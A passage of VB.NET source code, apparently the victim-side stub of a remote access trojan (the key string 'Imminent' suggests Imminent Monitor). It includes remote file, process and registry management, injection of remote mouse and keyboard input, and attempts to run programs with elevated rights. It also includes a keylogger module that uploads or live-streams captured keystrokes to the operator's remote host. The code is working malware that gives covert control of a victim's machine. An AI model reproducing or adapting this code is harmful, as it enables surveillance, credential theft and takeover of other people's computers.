            TcpRow = New MIB_TCPROW_OWNER_PID()
            TcpRow = CType(Marshal.PtrToStructure(pStructPointerTemp, GetType(MIB_TCPROW_OWNER_PID)), MIB_TCPROW_OWNER_PID)
            If Not ((GetState(TcpRow.dwState) = Nothing)) Then
                On Error Resume Next
                With TcpRow
                    Dim p As Process = Process.GetProcessById(CStr(.dwOwningPid))
                    cstring &= (CStr(.dwOwningPid)) & SplitMark1
                    cstring &= (p.ProcessName) & SplitMark1
                    cstring &= (GetIpFromLong(.dwLocalAddr)) & SplitMark1
                    cstring &= (CStr(GetTcpPortNumber(.dwLocalPort))) & SplitMark1
                    cstring &= (GetIpFromLong(.dwRemoteAddr)) & SplitMark1
                    cstring &= (CStr(GetTcpPortNumber(.dwRemotePort))) & SplitMark1
                    cstring &= ("TCP")
                    If Not ((GetState(.dwState) = Nothing)) Then
                        cstring &= (GetState(.dwState)) & splitMark2
                    Else
                        cstring &= ("Unknown") & splitMark2
                    End If
                End With
            End If
        Next
        Return cstring

    End Function

    Public Shared Function GetIpFromLong(ByRef lngIPAddress As Integer) As String
        On Error Resume Next
        Dim arrIpParts() As Byte = BitConverter.GetBytes(lngIPAddress)
        GetIpFromLong = CStr(arrIpParts(0)) & "." & CStr(arrIpParts(1)) & "." & CStr(arrIpParts(2)) & "." & CStr(arrIpParts(3))

    End Function

    Public Shared Function GetTcpPortNumber(ByRef DWord As Integer) As Integer
        On Error Resume Next
        GetTcpPortNumber = DWord / 256 + (DWord Mod 256) * 256
    End Function

    Public Shared Function GetState(ByRef lngState As Integer) As String
        On Error Resume Next
        Select Case lngState
            Case MIB_TCP_STATE_CLOSED : Return "STATE_CLOSED"
            Case MIB_TCP_STATE_LISTEN : Return "STATE_LISTEN"
            Case MIB_TCP_STATE_SYN_SENT : Return "SYN_SENT"
            Case MIB_TCP_STATE_SYN_RCVD : Return "SYN_RCVD"
            Case MIB_TCP_STATE_ESTAB : Return "STATE_ESTABLISHED"
            Case MIB_TCP_STATE_FIN_WAIT1 : Return "FIN_WAIT1"
            Case MIB_TCP_STATE_FIN_WAIT2 : Return "FIN_WAIT2"
            Case MIB_TCP_STATE_CLOSE_WAIT : Return "CLOSE_WAIT"
            Case MIB_TCP_STATE_CLOSING : Return "STATE_CLOSING"
            Case MIB_TCP_STATE_LAST_ACK : Return "STATE_LAST_ACK"
            Case MIB_TCP_STATE_TIME_WAIT : Return "TIME_WAIT"
            Case MIB_TCP_STATE_DELETE_TCB : Return "DELETE_TCB"
        End Select
        Return Nothing
    End Function

#End Region

End Class

#End Region

#Region " File Manager "

Public Class FileManaging

#Region "Declarations"
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const FilesFolders = 12
    Private Const SpecFolder = &H4
#End Region

#Region "Sending"
    Shared Sub DeleteFile(ByVal file As String)
        IO.File.Delete(file)
    End Sub
    Shared Sub DeleteFolder(ByVal path As Object)
        On Error Resume Next
        Dim target As New DirectoryInfo(path)
        Dim files As FileInfo() = target.GetFiles()
        Dim folders As DirectoryInfo() = target.GetDirectories
        For Each file As FileInfo In files
            IO.File.Delete(file.FullName)
        Next
        For Each folder In folders
            DeleteFolder(folder.FullName)
        Next
        Directory.Delete(path)
    End Sub
    Shared Sub SendFilesFolders(ByVal genericInfo As String)
        Try
            Dim path As Object = genericInfo.Split(SplitMark1)(2)
            If path = Nothing Then
                Send(Chr(FilesFolders) & GetDrives())
            ElseIf IsNumeric(path) Then
                Dim SpecialDir As String = ReturnSpecialFolderFromNumber(path)
                Send(Chr(FilesFolders) & GetFolders(SpecialDir) & GetFiles(SpecialDir) & Chr(SpecFolder) & SplitMark1 & SpecialDir & splitMark2)
            Else
                Send(Chr(FilesFolders) & GetFolders(path) & GetFiles(path) & SplitMark1 & path & splitMark2)
            End If
        Catch
        End Try
    End Sub

    Shared Function ReturnSpecialFolderFromNumber(ByVal FolderIdentifier As Integer) As String
        On Error Resume Next
        Select Case FolderIdentifier
            Case SpecialFolders.ApplicationData
                Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            Case SpecialFolders.CommonApplicationData
                Return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
            Case SpecialFolders.CommonProgramFiles
                Return Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)
            Case SpecialFolders.Cookies
                Return Environment.GetFolderPath(Environment.SpecialFolder.Cookies)
            Case SpecialFolders.Desktop
                Return My.Computer.FileSystem.SpecialDirectories.Desktop
            Case SpecialFolders.Favorites
                Return Environment.GetFolderPath(Environment.SpecialFolder.Favorites)
            Case SpecialFolders.History
                Return Environment.GetFolderPath(Environment.SpecialFolder.History)
            Case SpecialFolders.LocalApplicationData
                Return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            Case SpecialFolders.MyDocuments
                Return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            Case SpecialFolders.MyMusic
                Return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
            Case SpecialFolders.MyPictures
                Return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
            Case SpecialFolders.ProgramFiles
                Return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
            Case SpecialFolders.Recent
                Return Environment.GetFolderPath(Environment.SpecialFolder.Recent)
            Case SpecialFolders.StartMenu
                Return Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)
            Case SpecialFolders.Startup
                Return Environment.GetFolderPath(Environment.SpecialFolder.Startup)
            Case SpecialFolders.System
                Return Environment.GetFolderPath(Environment.SpecialFolder.System)
            Case SpecialFolders.Templates
                Return Environment.GetFolderPath(Environment.SpecialFolder.Templates)
            Case SpecialFolders.Temp
                Return My.Computer.FileSystem.SpecialDirectories.Temp
            Case SpecialFolders.Windows
                Return Environment.GetEnvironmentVariable("windir")
            Case SpecialFolders.Userprofile
                Return Environment.GetEnvironmentVariable("userprofile")
        End Select
        Return Nothing
    End Function
    Shared Sub Copy(ByVal file As String, ByVal ToPath As String)
        On Error Resume Next
        IO.File.Copy(file, ToPath)
    End Sub
#End Region

#Region "GET"
    Shared Function GetDrives() As String
        On Error Resume Next
        Dim allDrives() As DriveInfo = IO.DriveInfo.GetDrives()
        Dim DriveStrings As String = String.Empty
        For Each Drive In allDrives
            If Drive.IsReady Then
                Dim DType As Integer = 1
                If Drive.DriveType = DriveType.Fixed Then
                    DType = 12 'Local drive
                ElseIf Drive.DriveType = DriveType.CDRom Then
                    DType = 13 'CD/DVD
                ElseIf Drive.DriveType = DriveType.Network Then
                    DType = 14 'Network drive
                ElseIf Drive.DriveType = DriveType.Removable Then
                    DType = 15 'Removable drive
                ElseIf Drive.DriveType = DriveType.Ram Then
                    DType = 16 'RAM disk
                End If
                DriveStrings &= Chr(ItemType.Drive) & MainModule.SplitMark1 & Chr(DType) & MainModule.SplitMark1 & Drive.Name & MainModule.splitMark2
            End If
        Next
        Return DriveStrings
    End Function
    Shared Function GetFiles(ByVal Path As String) As String
        On Error Resume Next
        If IsNumeric(Path) Then
            Path = ReturnSpecialFolderFromNumber(Int(Path))
        End If
        Dim DirInfo As New DirectoryInfo(Path)
        Dim File As String = Nothing
        For Each fi As FileInfo In DirInfo.GetFiles()
            File += Chr(ItemType.File) & MainModule.SplitMark1 & fi.Name & MainModule.SplitMark1 & Int(fi.Length / 1024) & MainModule.SplitMark1 & GetAttributesFile(fi.FullName) & MainModule.SplitMark1 & fi.CreationTime & MainModule.SplitMark1 & fi.LastAccessTime & MainModule.splitMark2
        Next
        Return File
    End Function
    Shared Function GetFolders(ByVal Path As String) As String
        On Error Resume Next
        If IsNumeric(Path) Then
            Path = ReturnSpecialFolderFromNumber(Int(Path))
        End If
        Dim DirInfo As New IO.DirectoryInfo(Path)
        Dim Folders As String = Nothing
        For Each fo As IO.DirectoryInfo In DirInfo.GetDirectories()
            Folders += Chr(ItemType.Folder) & MainModule.SplitMark1 & fo.Name & MainModule.SplitMark1 & MainModule.SplitMark1 & GetAttributesFolder(fo.Name) & MainModule.SplitMark1 & fo.CreationTime & MainModule.SplitMark1 & fo.LastAccessTime & MainModule.SplitMark1 & MainModule.splitMark2
        Next
        Return Folders
    End Function
    Shared Function GetAttributesFile(ByVal Name As String) As String
        On Error Resume Next
        Dim attributes As String = Nothing
        Dim Attr As FileAttributes = File.GetAttributes(Name)
        If (Attr And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then
            attributes = "R"
        End If
        If (Attr And FileAttributes.Hidden) = FileAttributes.Hidden Then
            attributes += "H"
        End If
        If (Attr And FileAttributes.System) = FileAttributes.System Then
            attributes += "S"
        End If
        Return attributes
    End Function
    Shared Function GetAttributesFolder(ByVal Name As String) As String
        On Error Resume Next
        Dim attributes As String = Nothing
        Dim a As New DirectoryInfo(Name)
        If a.Attributes = FileAttributes.ReadOnly Then
            attributes += "R"
        End If
        If a.Attributes = FileAttributes.Hidden Then
            attributes += "H"
        End If
        If a.Attributes = FileAttributes.System Then
            attributes += "S"
        End If
        Return attributes
    End Function
    Public Shared Sub Wallpaper(ByVal Path As String)

        Try
            SystemParametersInfo(20, 0, Path, &H1)
        Catch
        End Try
    End Sub
    Shared Sub RenameFile(ByVal Path As String, ByVal Name As String)

        Try
            IO.File.Move(Path, Name)
        Catch : End Try
    End Sub
    Shared Sub RenameFolder(ByVal Path As String, ByVal Name As String)
        Try
            IO.Directory.Move(Path, Name)
        Catch : End Try
    End Sub
    Shared Sub RunAsAdmin(ByVal ExecutingInfo As Object)
        Try
            Dim processStartInfo As System.Diagnostics.ProcessStartInfo
            processStartInfo = New System.Diagnostics.ProcessStartInfo()
            processStartInfo.FileName = ExecutingInfo.Split(MainModule.SplitMark1)(1)
            processStartInfo.Arguments = ExecutingInfo.Split(MainModule.SplitMark1)(2)
            processStartInfo.Verb = "runas"
            Process.Start(processStartInfo)
        Catch
            Try
                Dim NormalProcess As ProcessStartInfo
                NormalProcess = New System.Diagnostics.ProcessStartInfo()
                NormalProcess.FileName = ExecutingInfo.Split(MainModule.SplitMark1)(1)
                NormalProcess.Arguments = ExecutingInfo.Split(MainModule.SplitMark1)(2)
                Process.Start(NormalProcess)
            Catch

            End Try
        End Try
    End Sub
#End Region

#Region "Enums"
    Public Enum ItemType
        File = &H1
        Folder = &H2
        Drive = &H3
    End Enum
    Public Enum SpecialFolders
        ApplicationData = 26
        CommonApplicationData = 35
        CommonProgramFiles = 43
        Cookies = 33
        Desktop = 0
        Favorites = 6
        History = 34
        LocalApplicationData = 28
        MyDocuments = 5
        MyMusic = 13
        MyPictures = 39
        ProgramFiles = 38
        Recent = 8
        StartMenu = 11
        Startup = 7
        System = 37
        Templates = 21
        Temp = 9
        Windows = 12
        Userprofile = 15
    End Enum
#End Region

End Class

#End Region

#Region " ImageManaging "
Public Class ImageManaging

#Region "Resize image"
    Public Shared Function ResizeImage(img As Image, width As Integer, height As Integer) As Image

        On Error Resume Next
        Dim b As New Bitmap(width, height)
        Using g As Graphics = Graphics.FromImage(DirectCast(b, Image))
            g.DrawImage(img, 0, 0, width, height)
        End Using

        Return DirectCast(b, Image)
    End Function
#End Region

#Region "Convert into jpeg"
    Public Shared Function ConvertToJpeg(ByRef img As Bitmap, ByVal q As Integer) As Image
        On Error Resume Next
        Const paramAmount As Integer = 2
        Dim qualityParam As New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, q)
        Dim jpegCodec As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        Dim encoderParams As New EncoderParameters(paramAmount)
        encoderParams.Param(0) = qualityParam
        encoderParams.Param(1) = New EncoderParameter(System.Drawing.Imaging.Encoder.Compression, Fix(EncoderValue.CompressionLZW), 50)
        Dim ms As New IO.MemoryStream
        img.Save(ms, jpegCodec, encoderParams)
        Return Image.FromStream(ms)

    End Function
    Public Shared Function compressImage(ByVal img As Image, ByVal q As Integer) As Image
        Try
            Dim jgpEncoder As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim myEncoder As New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, q)
            Dim myEncoderParameters As New EncoderParameters(1)
            Dim myEncoderParameter As New EncoderParameter(System.Drawing.Imaging.Encoder.Compression, CLng(EncoderValue.CompressionLZW))
            myEncoderParameters.Param(0) = myEncoderParameter
            Dim ms As MemoryStream = New MemoryStream()
            img.Save(ms, ImageFormat.Jpeg)
            Dim bmpBytes() As Byte
            bmpBytes = ms.ToArray()
            Return img
            ms.Close()
            ms = Nothing
        Catch
            Return Nothing
        End Try
    End Function
#End Region

#Region "Get encoder info"
    Private Shared Function GetEncoderInfo(ByVal mimeType As String) As ImageCodecInfo
        On Error Resume Next
        Dim codecs As ImageCodecInfo() = ImageCodecInfo.GetImageEncoders()
        For i As Integer = 0 To codecs.Length - 1
            If (codecs(i).MimeType = mimeType) Then
                Return codecs(i)
            End If
        Next i

        Return Nothing
    End Function
#End Region

#Region "Thumbnail"
    Public Shared Sub SendThumbnail(ByVal fName As String)
        Try
            Dim FileImg As Image = ImageManaging.ResizeImage(ImageFromFile(fName), 320, 177)
            Dim MS As New IO.MemoryStream
            FileImg.Save(MS, Imaging.ImageFormat.Jpeg)
            MainModule.Send(Chr(MainModule.CommandType.Thumbnail) & Convert.ToBase64String(MS.GetBuffer))
            MS.Close()
            MS.Dispose()
        Catch
        End Try
    End Sub
#End Region

#Region "Image from file"
    Public Shared Function ImageFromFile(ByVal filename As String) As Image
        Try
            Return Image.FromFile(filename)
        Catch
            Return Nothing
        End Try
    End Function
#End Region

End Class


#End Region

#Region " Input Managing "

Public Class InputManaging

#Region "Declarations"
    Public Shared Buf(1024 - 1) As Byte
    Public Shared length As Integer = 0
    Const Input = 13
    Const Mouse = &H1
    Public Enum MouseButton As Byte
        Left = &H1
        Right = &H2
        Move = &H3
        Scroll = &H4
        Middle = &H5
    End Enum
    Public Enum Action As Byte
        Up = &H1
        Down = &H2
        Move = &H3
        ScrollUp = &H4
        ScrollDown = &H5
    End Enum
    Const Keyboard = &H2
#End Region

#Region " Connect input socket "
    Public Shared Sub StartRemoteInput(ByVal id As Object)
        On Error Resume Next
        Dim inputThread As New Thread(AddressOf ListenInput)
        inputThread.SetApartmentState(ApartmentState.STA)
        inputThread.Start(id)
    End Sub
    Public Shared inputSock As TcpClient
    Public Shared Sub ListenInput(ByVal id As Object)
        Try
            inputSock = New TcpClient
            inputSock.Connect(compilerSettings.remoteHost, compilerSettings.remotePort)
            inputSock.ReceiveBufferSize = 1024
            inputSock.SendBufferSize = 1024
            inputSock.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(Input) & MainModule.SplitMark1 & id))
            Dim InputStream As NetworkStream = inputSock.GetStream
            While True
                length = InputStream.Read(Buf, 0, Buf.Length)
                If length = 0 Then Exit While
                HandleCommand(Buf, length)
                Array.Clear(Buf, 0, Buf.Length)
            End While
        Catch ex As Exception
            If inputSock IsNot Nothing Then
                inputSock.GetStream.Close()
                inputSock.Close()
            End If
        End Try
    End Sub
    Public Shared Sub HandleCommand(ByVal Buf() As Byte, ByVal Len As Integer)
        On Error Resume Next
        For BufX As Integer = 0 To Len
            Select Case Buf(BufX)
                Case Mouse
                    Dim A As Action = Buf(BufX + 1)
                    Dim B As MouseButton = Buf(BufX + 2)
                    Dim X As Short = System.BitConverter.ToInt16(Buf, 3)
                    Dim Y As Short = System.BitConverter.ToInt16(Buf, 5)
                    Dim Width As Short = System.BitConverter.ToInt16(Buf, 7)
                    Dim Height As Short = System.BitConverter.ToInt16(Buf, 9)
                    Select Case B
                        Case MouseButton.Left
                            Select Case A
                                Case Action.Down
                                    MouseLeft(X, Y, Width, Height)
                                Case Action.Up
                                    MouseUp(X, Y, Width, Height)
                            End Select
                        Case MouseButton.Right
                            Select Case A
                                Case Action.Down
                                    MouseDownRight(X, Y, Width, Height)
                                Case Action.Up
                                    MouseUpRight(X, Y, Width, Height)
                            End Select
                        Case MouseButton.Middle
                            Select Case A
                                Case Action.Down
                                    MouseDownMiddle(X, Y, Width, Height)
                                Case Action.Up
                                    MouseUpMiddle(X, Y, Width, Height)
                            End Select
                        Case MouseButton.Move
                            Select Case A
                                Case Action.Move
                                    MouseMove(X, Y, Width, Height)
                            End Select
                        Case MouseButton.Scroll
                            Select Case A
                                Case Action.ScrollUp
                                    mouse_event(&H800, 0, 0, 120, 0)
                                Case Action.ScrollDown
                                    mouse_event(&H800, 0, 0, -120, 0)
                            End Select
                    End Select
                    BufX += 12
                Case Keyboard
                    Dim A As Action = Buf(BufX + 1)
                    Dim KeyCode As Integer = Buf(BufX + 2)
                    Select Case A
                        Case Action.Down
                            KeyDown(KeyCode)
                        Case Action.Up
                            KeyUp(KeyCode)
                    End Select
                    BufX += 3
            End Select
        Next
    End Sub
#End Region

#Region " Key Events "
    Shared Sub KeyDown(ByVal code As Integer)
        On Error Resume Next
        Dim ScanCode As Byte = MapVirtualKey(code, 0)
        keybd_event(code, ScanCode, 0, 0)
    End Sub
    Shared Sub KeyUp(ByVal code As Integer)
        On Error Resume Next
        Dim ScanCode As Byte = MapVirtualKey(code, 0)
        keybd_event(code, ScanCode, &H2, 0)
    End Sub
    Shared Sub SendKeyString(ByVal keys As String)
        Try
            SendKeys.SendWait(keys)
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region " Mouse Events "
    Public Shared Screeny As Screen
    Shared Sub MouseLeft(ByVal X As Short, ByVal Y As Short, ByVal Width As Short, ByVal Height As Short)
        Try
            Dim r As Rectangle
            Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
            r = Screeny.Bounds
            Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
            Cursor.Position = B
            mouse_event(&H2, 0, 0, 0, 1)
        Catch ex As Exception
        End Try
    End Sub
    Shared Sub MouseUp(ByVal X As Short, ByVal Y As Short, ByVal Width As Short, ByVal Height As Short)
        Try
            Dim r As Rectangle
            Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
            r = Screeny.Bounds
            Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
            Cursor.Position = B
            mouse_event(&H4, 0, 0, 0, 1)
        Catch ex As Exception
        End Try
    End Sub
    Shared Sub MouseMove(ByVal X As Short, ByVal Y As Short, ByVal Width As Short, ByVal Height As Short)
        Try
            Dim r As Rectangle
            Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
            r = Screeny.Bounds
            Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
            Cursor.Position = B
            mouse_event(&H1, 0, 0, 0, 1)
        Catch ex As Exception
        End Try
    End Sub
    Shared Sub MouseDownRight(ByVal X As String, ByVal Y As String, ByVal Width As String, ByVal Height As String)
        Try
            Dim r As Rectangle
            Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
            r = Screeny.Bounds
            Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
            Cursor.Position = B
            mouse_event(&H8, 0, 0, 0, 1)
        Catch
        End Try
    End Sub
    Shared Sub MouseUpRight(ByVal X As String, ByVal Y As String, ByVal Width As String, ByVal Height As String)
        Try
            Dim r As Rectangle
            Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
            r = Screeny.Bounds
            Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
            Cursor.Position = B
            mouse_event(&H10, 0, 0, 0, 1)
        Catch
        End Try
    End Sub
    Shared Sub MouseDownMiddle(ByVal X As String, ByVal Y As String, ByVal Width As String, ByVal Height As String)
        On Error Resume Next
        Dim r As Rectangle
        Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
        r = Screeny.Bounds
        Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
        Cursor.Position = B
        mouse_event(&H20, 0, 0, 0, 1)
    End Sub
    Shared Sub MouseUpMiddle(ByVal X As String, ByVal Y As String, ByVal Width As String, ByVal Height As String)
        On Error Resume Next
        Dim r As Rectangle
        Screeny = Screen.AllScreens(RemoteDesktop.Scr - 1)
        r = Screeny.Bounds
        Dim B As New Point(Int((r.Width * X / Width) + r.X), Int((r.Height * Y / Height) + r.Y))
        Cursor.Position = B
        mouse_event(&H40, 0, 0, 0, 1)
    End Sub
#End Region

End Class

#End Region

#Region " Log Managing "

Public Class LogManaging

#Region " Declarations "
    Private LoggingLive As Integer = 1
    Private DelLogAfter As Integer = 1
    Private connectionId As Integer
    Private LiveThread As Thread
    Private TransferThread As Thread
    Private Hooker As KeyHook
    Private Const RemoteKeylogger = 4
#End Region

#Region " Log Managing "
    Public Sub InitializeTransfer(ByVal id As Integer, ByVal Live As Integer, ByVal DelLog As Integer, ByRef HookClass As KeyHook)
        On Error Resume Next
        connectionId = id
        Hooker = HookClass
        LoggingLive = Live
        DelLogAfter = DelLog
        If Live = 2 Then
            LiveThread = New Thread(AddressOf SendLive)
            LiveThread.SetApartmentState(ApartmentState.STA) : LiveThread.Start()
            liveLogger = True
        Else
            TransferThread = New Thread(AddressOf SendLog)
            TransferThread.SetApartmentState(ApartmentState.STA) : TransferThread.Start()
            TransferThread.IsBackground = True
            Thread.Sleep(500)
        End If
    End Sub
#End Region

#Region " Sending "
    Public Sub SendLog()
        Dim LogClient As TcpClient
        Try
            LogClient = New TcpClient(compilerSettings.remoteHost, compilerSettings.remotePort)
            LogClient.SendBufferSize = 51200
            LogClient.ReceiveBufferSize = 1024
            Dim InfoBuf() As Byte = System.Text.Encoding.UTF8.GetBytes(Chr(RemoteKeylogger) & MainModule.SplitMark1 & connectionId & MainModule.SplitMark1 & Chr(LoggingLive) & MainModule.SplitMark1 & New IO.FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt").Length)
            LogClient.Client.Send(InfoBuf, InfoBuf.Length, SocketFlags.None)
            Thread.Sleep(1000)
            LogClient.Client.SendFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
            If DelLogAfter = 2 Then StartNewLog()
            LogClient.GetStream.Close()
            LogClient.Close()
            LogClient = Nothing
            TransferThread.Abort()
        Catch ex As Exception
            LogClient = Nothing
            TransferThread.Abort()
        End Try
    End Sub
    Public Sub StartNewLog()
        Try
            Dim E As New Encryption
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
            Dim sr As New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
            sr.Write(E.Encrypt("Imminent", "New Log Started " & Date.Now.ToString & vbNewLine))
            sr.Close()
            sr.Dispose()
        Catch
        End Try
    End Sub
    Dim LiveLogClient As TcpClient
    Public Sub SendLive()
        Dim b() As Byte
        Try
            LiveLogClient = New TcpClient(MainModule.compilerSettings.remoteHost, MainModule.compilerSettings.remotePort)
            LiveLogClient.SendBufferSize = 1024
            LiveLogClient.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(RemoteKeylogger) & MainModule.SplitMark1 & connectionId & MainModule.SplitMark1 & Chr(LoggingLive)))
            Thread.Sleep(1000)
            Dim nstm As Stream = LiveLogClient.GetStream()
            While LiveLogClient.Connected
                Thread.Sleep(100)
                If Not liveKeys = Nothing Then
                    b = System.Text.Encoding.UTF8.GetBytes(liveKeys)
                    nstm.Write(b, 0, b.Length)
                    b = Nothing
                    liveKeys = Nothing
                End If
            End While
            LiveLogClient.GetStream.Close()
            LiveLogClient.Close()
            nstm.Close()
            nstm.Dispose()
            GC.Collect()
            liveLogger = False
            Exit Sub
        Catch ex As Exception
            Try
                LiveLogClient.GetStream.Close()
                LiveLogClient.Close()
                LiveLogClient.Client.Close()
                liveLogger = False
                liveKeys = Nothing
                b = Nothing
                Exit Sub
            Catch ex1 As Exception

            End Try

        End Try
    End Sub
#End Region

End Class

#End Region

#Region " Process Managing "

Public Class ProcessManaging

#Region " Declarations "
    Private Const Processes = 10
#End Region

#Region " Sending "
    Shared Sub SendProcesses(ByVal id As String)
        Try
            MainModule.Send(Chr(Processes) & GetProcesses() & Chr(SystemInformation.GetRamUsage))
        Catch
        End Try
    End Sub
    Shared Function ResumeProcess(ByVal pid As Integer) As Boolean
        Try
            Dim AllSuccess As Boolean = True
            For Each thread As ProcessThread In Process.GetProcessById(pid).Threads
                If Not ResumeThread(GetHandleFromThreadID(thread.Id)) Then
                    AllSuccess = False
                End If
            Next
            Return AllSuccess
        Catch
            Return False
        End Try
    End Function
#End Region

#Region " GET/Return "
    Shared Function GetProcesses() As String
        Try
            Dim ProcessString As String = Nothing
            For Each p As Process In Process.GetProcesses
                Dim Path As String = Nothing
                Try
                    Path = p.MainModule.FileName
                Catch
                    Path = "N/A"
                End Try
                Dim title As String = Nothing
                Try
                    title = p.MainWindowTitle
                Catch
                    title = "N/A"
                End Try
                ProcessString &= p.ProcessName & MainModule.SplitMark1 & p.Id & MainModule.SplitMark1 & title & MainModule.SplitMark1 & Path & MainModule.SplitMark1 & p.WorkingSet64 / 1024 & MainModule.SplitMark1 & MainModule.splitMark2
            Next
            Return ProcessString
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Shared Function KillProcess(ByVal PID As Integer) As Boolean
        Try
            Process.GetProcessById(PID).Kill()
            Return True
        Catch
            Return False
        End Try
    End Function
    Shared Function GetHandleFromThreadID(ByVal id As Integer) As Integer
        Try
            Return OpenThread(&H2, False, id)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Shared Function SuspendProcess(ByVal pid As Integer) As Boolean
        Try
            Dim AllSuccess As Boolean = True
            For Each thread As ProcessThread In Process.GetProcessById(pid).Threads
                If Not SuspendThread(GetHandleFromThreadID(thread.Id)) Then
                    AllSuccess = False
                End If
            Next
            Return AllSuccess
        Catch
            Return False
        End Try
    End Function
#End Region

End Class

#End Region

#Region " Registry Managing "


Public Class RegistryManaging

    Public Const ItemSubkey = 12
    Public Const RegistryList = 99

    Public Shared Sub SendReg(ByVal stuff As String)
        Try
            MainModule.Send(Chr(RegistryList) & GetSubkeys(Asc(stuff.Split(MainModule.SplitMark1)(2)), stuff.Split(MainModule.SplitMark1)(3)) & GetValues(Asc(stuff.Split(MainModule.SplitMark1)(2)), stuff.Split(MainModule.SplitMark1)(3)))
        Catch
        End Try
    End Sub

#Region " GET/Return "
    Public Shared Function GetSubkeys(ByVal identifier As Integer, ByVal path As String) As String
        Try
            Dim reghive As RegistryKey = IdentifyRootKey(identifier)
            Dim allinfo As String = Nothing
            If String.IsNullOrEmpty(path) Then
                For Each subkeys In reghive.GetSubKeyNames
                    allinfo += subkeys & MainModule.SplitMark1 & Chr(ItemSubkey) & MainModule.splitMark2
                Next
                Return allinfo
            Else
                Dim Key As Microsoft.Win32.RegistryKey = reghive.OpenSubKey(path, False)
                For Each subkey In Key.GetSubKeyNames
                    allinfo += subkey & MainModule.SplitMark1 & Chr(ItemSubkey) & MainModule.splitMark2
                Next
                Return allinfo
            End If
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Public Shared Function GetValues(ByVal identifier As Integer, ByVal path As String) As String
        On Error Resume Next
        Dim reghive As RegistryKey = IdentifyRootKey(identifier)
        Dim allinfo As String = Nothing
        If String.IsNullOrEmpty(path) Then
            Dim Key As Microsoft.Win32.RegistryKey = reghive.OpenSubKey(String.Empty, False)
            For Each value In Key.GetValueNames
                Dim regkind As Integer = Int(Key.GetValueKind(value))
                Dim regvalue As String = Key.GetValue(value)
                allinfo += value & MainModule.SplitMark1 & Chr(regkind) & MainModule.SplitMark1 & regvalue & MainModule.splitMark2
            Next
            Return allinfo
        Else
            Dim Key As Microsoft.Win32.RegistryKey = reghive.OpenSubKey(path, False)
            For Each value In Key.GetValueNames
                Dim regkind As Integer = Int(Key.GetValueKind(value))
                Dim regvalue As String = Key.GetValue(value)
                allinfo += value & MainModule.SplitMark1 & Chr(regkind) & MainModule.SplitMark1 & regvalue & MainModule.splitMark2
            Next
            Return allinfo
        End If
    End Function
#End Region

#Region " Actions "
    Public Shared Sub DelRegValue(ByVal identifier As Integer, ByVal path As String, ByVal regname As String)
        Try
            Dim reghive As RegistryKey = IdentifyRootKey(identifier)
            Dim delKey As RegistryKey = reghive.OpenSubKey(path, True)
            delKey.DeleteValue(regname)
            delKey.Close()
        Catch
        End Try
    End Sub
    Public Shared Sub CreateValue(ByVal identifier As Integer, ByVal ValueIdentifier As Integer, ByVal path As String, ByVal valuename As String, ByVal value As String)
        Try
            Dim reghive As RegistryKey = IdentifyRootKey(identifier)
            Dim type As RegistryValueKind = IdentifyValueType(ValueIdentifier)
            Dim key As RegistryKey = reghive.OpenSubKey(path, True)
            key.SetValue(valuename, value, type)
            key.Close()
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Sub DelRegSubkey(ByVal identifier As Integer, ByVal path As String, ByVal regname As String)
        Try
            Dim reghive As RegistryKey = IdentifyRootKey(identifier)
            Dim delKey As RegistryKey = reghive.OpenSubKey(path, True)
            delKey.DeleteSubKeyTree(regname)
            delKey.Close()
        Catch ex As Exception

        End Try
    End Sub
    Public Shared Sub CreateSubkey(ByVal identifier As Integer, ByVal path As String, ByVal subkeyname As String)
        Try
            Dim reghive As RegistryKey = IdentifyRootKey(identifier)
            Dim key As RegistryKey = reghive.OpenSubKey(path, True)
            key.CreateSubKey(subkeyname)
            key.Close()
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Function IdentifyRootKey(ByVal KeyIdentifier As Integer) As RegistryKey
        On Error Resume Next
        Select Case KeyIdentifier
            Case 1 'HKEY_CLASSES_ROOT
